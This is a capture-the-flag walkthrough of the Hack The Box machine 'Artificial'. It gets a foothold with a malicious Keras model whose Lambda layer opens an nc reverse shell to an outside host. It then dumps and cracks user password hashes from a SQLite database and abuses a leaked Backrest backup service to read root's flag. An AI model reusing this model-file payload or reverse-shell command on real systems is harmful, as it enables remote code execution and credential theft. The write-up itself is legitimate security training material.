## Enumeration:

#### NMAP result:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

#### URL SCAN (dirb):

```
---- Scanning URL: http://artificial.htb/ ----
+ http://artificial.htb/dashboard (CODE:302|SIZE:199)                                                              
+ http://artificial.htb/login (CODE:200|SIZE:857)                                                                  
+ http://artificial.htb/logout (CODE:302|SIZE:189)                                                                 
+ http://artificial.htb/register (CODE:200|SIZE:952)
```

## Service Exploration:

This service allows us to test our AI models and gives us examples on how to build one (once registered).

## Possible exploitation path (Foothold)

Exploitation of the model tester directly on the server :

exemple from the target :

```python
import numpy as np
import pandas as pd
import tensorflow as tf
from tensorflow import keras
from tensorflow.keras import layers

np.random.seed(42)

# Create hourly data for a week
hours = np.arange(0, 24 * 7)
profits = np.random.rand(len(hours)) * 100

# Create a DataFrame
data = pd.DataFrame({
    'hour': hours,
    'profit': profits
})

X = data['hour'].values.reshape(-1, 1)
y = data['profit'].values

# Build the model
model = keras.Sequential([
    layers.Dense(64, activation='relu', input_shape=(1,)),
    layers.Dense(64, activation='relu'),
    layers.Dense(1)
])

# Compile the model
model.compile(optimizer='adam', loss='mean_squared_error')

# Train the model
model.fit(X, y, epochs=100, verbose=1)

# Save the model
model.save('profits_model.h5')
```

I will spawn a reverse shell by compiling my malicious model. I’ll use the provided Dockerfile by the target but modify it with my malicious script:

```docker
FROM python:3.8-slim

WORKDIR /code

# Copy the malicious.py script into the container
COPY malicious.py .

RUN apt-get update && \
    apt-get install -y curl && \
    curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl && \
    rm -rf /var/lib/apt/lists/*

RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl

ENTRYPOINT ["/bin/bash"]
```

With this model generation:

```python
import tensorflow as tf

def exploit(x):
    import os
    os.system("rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.123 1223 >/tmp/f")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")
```

which allows me to spawn a reverse shell.

I build the Docker:
`docker build -t my-tf-image .`

I connect to it:
`docker run --rm -it -v "$(pwd)":/output my-tf-image`

After running Python, I start a web server on the Docker container to retrieve exploit.h5:
`python3 -m http.server`

Then on my machine:
`wget http://172.17.0.2:8000/exploit.h5`

Finally, I prepare the listener:
`nc -lv 1223`

I create an account on the platform to publish the model, and by clicking “View Prediction” the shell is active.

While browsing with my reverse-shell, I find a database in the instance: `users.db` containing this information:

```
$ sqlite3 users.db
.tables
model  user 
select * from user;
1|gael|gael@artificial.htb|c99175974b6e192936d97224638a34f8
2|mark|mark@artificial.htb|0f3d8c76530022670f1c6029eed09ccb
3|robert|robert@artificial.htb|b606c5f5136170f15444251665638b36
4|royer|royer@artificial.htb|bc25b1f80f544c0ab451c02a3dca9fc6
5|mary|mary@artificial.htb|bf041041e57f1aff3be7ea1abd6129d0
6|hello|hello@hello.com|5d41402abc4b2a76b9719d911017c592
7|afsh4ck|afsh4ck@test.es|cfcdcac9d35d8bce69817867fc216ea2
8|demo|demo@htb.com|5f4dcc3b5aa765d61d8327deb882cf99
9|v3x|vex@gmail.com|6ebd4b217b05f7722854816e42c0ff13
10|admin|test@test.com|098f6bcd4621d373cade4e832627b4f6
11|user|user@user.com|88b87698be0bc461f3cacf1f080929d5
12|pino|pino@pino.it|3080d0cf183721b6c35affb8e3bf8f15
13|Zeroz|lol@pawned.com|098f6bcd4621d373cade4e832627b4f6
14|ola|ola@ola.com|2fe04e524ba40505a82e03a2819429cc
15|marvin|marvin@123|202cb962ac59075b964b07152d234b70
```

By sending Gael’s hash to Crackstation, I find the password: `mattp005numbertwo`

I can then connect via SSH:
`ssh gael@<ip htb>`

And obtain the user flag in user.txt:
`29cf0fba3c5d4bb974260a210b744c3b`

---

## Privilege Escalation to Root:

By uploading linpeas.sh (`scp linpeas.sh gael@10.10.11.74:/tmp`)

I find an interesting file I can recover: `/var/backups/backrest_backup.tar.gz`

I download it for analysis:
`scp gael@10.10.11.74:/var/backups/backrest_backup.tar.gz .`

I analyze and inspect its structure:

```bash
tree -la backrest
backrest
├── .config
│   └── backrest
│       └── config.json
├── backrest
├── install.sh
├── jwt-secret
├── oplog.sqlite
├── oplog.sqlite-shm
├── oplog.sqlite-wal
├── oplog.sqlite.lock
├── processlogs
│   └── backrest.log
├── restic
└── tasklogs
    ├── .inprogress
    ├── logs.sqlite
    ├── logs.sqlite-shm
    └── logs.sqlite-wal
```

I find this interesting file:

```bash
backrest
├── .config
│   └── backrest
│       └── config.json
```

```json
{
  "modno": 2,
  "version": 4,
  "instance": "Artificial",
  "auth": {
    "disabled": false,
    "users": [
      {
        "name": "backrest_root",
        "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
      }
    ]
  }
}
```

I decode this hash and crack it:

`$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO`

```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
...
$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO:!@#$%^
```

So the password is: `!@#$%^` for what seems to be an exposed service.

Looking at the installation file: `backrest/install.sh`

I find the port that is supposed to be exposed:

```
<key>BACKREST_PORT</key>
<string>127.0.0.1:9898</string>
```

I check the ports with linpeas (also visible with `ss -tuln`):

```
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:9898          0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN
tcp6       0      0 :::22                   :::*                    LISTEN
tcp6       0      0 :::80                   :::*                    LISTEN
```

And it is indeed open, so I pivot onto it using port forwarding:

```
ssh gael@10.10.11.74 -L 9898:127.0.0.1:9898
```

Then I connect on localhost:9898.

As seen earlier, I already have the credentials for `backrest_root` (`!@#$%^`).

I will exploit backrest for dumping root.txt

I create a repository and a backup plan following this doc:
[https://linuxconfig.org/simplify-restic-backups-with-backrest-a-step-by-step-tutorial](https://linuxconfig.org/simplify-restic-backups-with-backrest-a-step-by-step-tutorial)

and I retrieve the archive containing `root.txt`.